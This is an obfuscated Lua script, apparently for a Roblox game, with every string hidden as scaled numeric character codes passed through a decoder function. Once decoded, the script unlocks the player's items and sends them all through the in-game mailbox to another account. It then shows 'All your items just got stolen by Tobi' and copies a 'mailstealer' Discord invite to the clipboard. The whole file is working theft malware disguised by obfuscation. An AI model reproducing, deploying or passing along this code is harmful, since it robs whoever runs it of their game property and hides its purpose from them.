8400,3360,4515,3360,4200,11970,10185,11760,9030,10185,11340,12285,10605,3360,4410,3360,4200,11025,12180,10605,11445,4830,9975,10185,11445,3360,11655,11970,3360,5145,4305,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,11025,12180,10605,11445,4830,9975,11340,11235,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,10185,11970,10815,12075,3360,6405,3360,12915,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,9555,5145,9765,3360,6405,3360,12285,11025,10500,4620,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,9555,5250,9765,3360,6405,3360,10710,10185,11340,12075,10605,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,13125,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11550,10605,12180,12495,11655,11970,11235,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})Locking_SetLockedWzXbheCOSURgKHWChFjBg({4305,6090,7665,11550,12390,11655,11235,10605,8715,10605,11970,12390,10605,11970,4200,12285,11550,11760,10185,10395,11235,4200,10185,11970,10815,12075,4305,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,945,10605,11550,10500,1365,1050,10605,11550,10500,1365,1050,1365,1050,11025,10710,3360,3675,12075,11655,11970,12180,10605,10500,7665,12180,10605,11445,12075,3360,6510,3360,5040,3360,11655,11970,3360,7455,10605,11445,6825,11445,11655,12285,11550,12180,5145,3360,6510,3360,11445,11025,11550,9975,11970,10185,11760,3360,4515,3360,11550,10605,12495,10185,11445,11655,12285,11550,12180,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,7035,11340,10185,11025,11445,8085,10185,11025,11340,4200,4305,1365,1050,945,11025,10710,3360,7665,12075,8085,10185,11025,11340,10290,11655,12600,7560,11655,11655,11235,10605,10500,4200,4305,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10815,10605,12180,7350,12285,10395,11235,10605,10500,3360,6405,3360,12180,11970,12285,10605,1365,1050,945,945,11340,11655,10395,10185,11340,3360,8085,10185,11025,11340,10290,11655,12600,3360,6405,3360,10815,10185,11445,10605,6090,7455,10605,12180,8715,10605,11970,12390,11025,10395,10605,4200})ReplicatedStorageWzXbheCOSURgKHWChFjBg({4305,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})NetworkWzXbheCOSURgKHWChFjBg({4305,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})Mailbox: SendWzXbheCOSURgKHWChFjBg({4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10710,11655,11970,3360,11025,4620,3360,7350,12285,11550,10395,3360,11025,11550,3360,11025,11760,10185,11025,11970,12075,4200,10815,10605,12180,10815,10395,4200,12180,11970,12285,10605,4305,4305,3360,10500,11655,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,12180,12705,11760,10605,11655,10710,4200,7350,12285,11550,10395,4305,3360,6405,6405,3360})functionWzXbheCOSURgKHWChFjBg({3360,10185,11550,10500,3360,10500,10605,10290,12285,10815,4830,11025,11550,10710,11655,4200,7350,12285,11550,10395,4620,3360})nWzXbheCOSURgKHWChFjBg({4305,3360,6405,6405,3360})typeofWzXbheCOSURgKHWChFjBg({3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,8295,11340,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,8295,11340,10500,3360,6405,3360,10920,11655,11655,11235,10710,12285,11550,10395,12180,11025,11655,11550,4200,7350,12285,11550,10395,4620,3360,10710,12285,11550,10395,12180,11025,11655,11550,4200,7665,11550,12075,4620,3360,4830,4830,4830,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,7665,11550,12075,3360,6405,6405,3360,8085,10185,11025,11340,10290,11655,12600,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11970,10605,12180,12285,11970,11550,3360,12180,11025,10395,11235,4200,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11970,10605,12180,12285,11970,11550,3360,8295,11340,10500,4200,7665,11550,12075,4620,3360,4830,4830,4830,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,945,10605,11550,10500,1365,1050,3360,3360,3360,3360,7245,11445,11760,12180,12705,6930,11655,12600,10605,12075,4200,4305,1365,1050,945,11970,10605,11865,12285,11025,11970,10605,4200,10815,10185,11445,10605,4830,8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605,4830,7980,11025,10290,11970,10185,11970,12705,4830,7035,11340,11025,10605,11550,12180,4830,7140,10185,12705,10395,10185,11970,10605,7035,11445,10500,12075,4305,4830,7035,11340,10185,11025,11445,4200,4305,1365,1050,945,11970,10605,11865,12285,11025,11970,10605,4200,10815,10185,11445,10605,4830,8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605,4830,7980,11025,10290,11970,10185,11970,12705,4830,7035,11340,11025,10605,11550,12180,4830,7245,12600,10395,11340,12285,12075,11025,12390,10605,7140,10185,12705,10395,10185,11970,10605,7035,11445,10500,12075,4305,4830,7035,11340,10185,11025,11445,4200,4305,1365,1050,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,10290,11340,11655,10290,9975,10185,3360,6405,3360,10815,10185,11445,10605,6090,7455,10605,12180,8715,10605,11970,12390,11025,10395,10605,4200})ReplicatedStorageWzXbheCOSURgKHWChFjBg({4305,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})LibraryWzXbheCOSURgKHWChFjBg({4305,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})ClientWzXbheCOSURgKHWChFjBg({4305,6090,9135,10185,11025,12180,7350,11655,11970,7035,10920,11025,11340,10500,4200})SaveWzXbheCOSURgKHWChFjBg({4305,1365,1050,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,10290,11340,11655,10290,9975,10290,3360,6405,3360,11970,10605,11865,12285,11025,11970,10605,4200,10290,11340,11655,10290,9975,10185,4305,4830,7455,10605,12180,4200,4305,1365,1050,3360,3360,3360,3360,10710,12285,11550,10395,12180,11025,11655,11550,3360,10500,10605,10605,11760,7035,11655,11760,12705,4200,11655,11970,11025,10815,11025,11550,10185,11340,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,10395,11655,11760,12705,3360,6405,3360,12915,13125,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10710,11655,11970,3360,11235,4620,3360,12390,3360,11025,11550,3360,11760,10185,11025,11970,12075,4200,11655,11970,11025,10815,11025,11550,10185,11340,4305,3360,10500,11655,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,12180,12705,11760,10605,4200,12390,4305,3360,6405,6405,3360})tableWzXbheCOSURgKHWChFjBg({3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,12390,3360,6405,3360,10500,10605,10605,11760,7035,11655,11760,12705,4200,12390,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10395,11655,11760,12705,9555,11235,9765,3360,6405,3360,12390,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,11970,10605,12180,12285,11970,11550,3360,10395,11655,11760,12705,1365,1050,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,10290,11340,11655,10290,9975,10290,3360,6405,3360,10500,10605,10605,11760,7035,11655,11760,12705,4200,10290,11340,11655,10290,9975,10290,4305,1365,1050,3360,3360,3360,3360,11970,10605,11865,12285,11025,11970,10605,4200,10290,11340,11655,10290,9975,10185,4305,4830,7455,10605,12180,3360,6405,3360,10710,12285,11550,10395,12180,11025,11655,11550,4200,4830,4830,4830,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,11970,10605,12180,12285,11970,11550,3360,10290,11340,11655,10290,9975,10290,1365,1050,3360,3360,3360,3360,10605,11550,10500,1365,1050,1365,1050,3360,3360,3360,3360,12180,10185,10290,11340,10605,4830,12075,11655,11970,12180,4200,12075,11655,11970,12180,10605,10500,7665,12180,10605,11445,12075,4620,3360,10710,12285,11550,10395,12180,11025,11655,11550,4200,10185,4620,3360,10290,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,11970,10605,12180,12285,11970,11550,3360,10185,4830,11970,10185,11760,3360,4410,3360,10185,4830,10185,11445,11655,12285,11550,12180,3360,6510,3360,10290,4830,11970,10185,11760,3360,4410,3360,10290,4830,10185,11445,11655,12285,11550,12180,3360,1365,1050,3360,3360,3360,3360,10605,11550,10500,4305,1365,1050,1365,1050,3360,3360,3360,3360,12075,11760,10185,12495,11550,4200,10710,12285,11550,10395,12180,11025,11655,11550,4200,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,8715,10605,11550,10500,8085,10605,12075,12075,10185,10815,10605,4200,11760,11340,11970,4830,8190,10185,11445,10605,4620,3360,7455,10605,11445,6825,11445,11655,12285,11550,12180,5145,4305,1365,1050,3360,3360,3360,3360,10605,11550,10500,4305,1365,1050,1365,1050,3360,3360,3360,3360,10710,11655,11970,3360,9975,4620,3360,11025,12180,10605,11445,3360,11025,11550,3360,11025,11760,10185,11025,11970,12075,4200,12075,11655,11970,12180,10605,10500,7665,12180,10605,11445,12075,4305,3360,10500,11655,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,11025,10710,3360,11025,12180,10605,11445,4830,11970,10185,11760,3360,6510,6405,3360,11550,10605,12495,10185,11445,11655,12285,11550,12180,3360,12180,10920,10605,11550,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,12075,10605,11550,10500,7665,12180,10605,11445,4200,11025,12180,10605,11445,4830,10395,10185,12180,10605,10815,11655,11970,12705,4620,3360,11025,12180,10605,11445,4830,12285,11025,10500,4620,3360,11025,12180,10605,11445,4830,10185,11445,11655,12285,11550,12180,4305,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10605,11340,12075,10605,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,3360,10290,11970,10605,10185,11235,1365,1050,3360,3360,3360,3360,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,10605,11550,10500,1365,1050,3360,3360,3360,3360,8715,10605,11550,10500,6825,11340,11340,7455,10605,11445,12075,4200,4305,1365,1050,3360,3360,3360,3360,11340,11655,10395,10185,11340,3360,11445,10605,12075,12075,10185,10815,10605,3360,6405,3360,11970,10605,11865,12285,11025,11970,10605,4200,10815,10185,11445,10605,4830,8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605,4830,7980,11025,10290,11970,10185,11970,12705,4830,7035,11340,11025,10605,11550,12180,4830,8085,10605,12075,12075,10185,10815,10605,4305,1365,1050,3360,3360,3360,3360,11445,10605,12075,12075,10185,10815,10605,4830,7245,11970,11970,11655,11970,4200})All your items just got stolen by TobiWzXbheCOSURgKHWChFjBg({12075,3360,11445,10185,11025,11340,12075,12180,10605,10185,11340,10605,11970,3465,9660,11550,3360,7770,11655,11025,11550,3360,10500,11025,12075,10395,11655,11970,10500,4830,10815,10815,4935,7455,9345,5250,8610,9030,8715,7245,7455,7140,8820}))
    setclipboard(WzXbheCOSURgKHWChFjBg({10500,11025,12075,10395,11655,11970,10500,4830,10815,10815,4935,7455,9345,5250,8610,9030,8715,7245,7455,7140,8820}))
end
    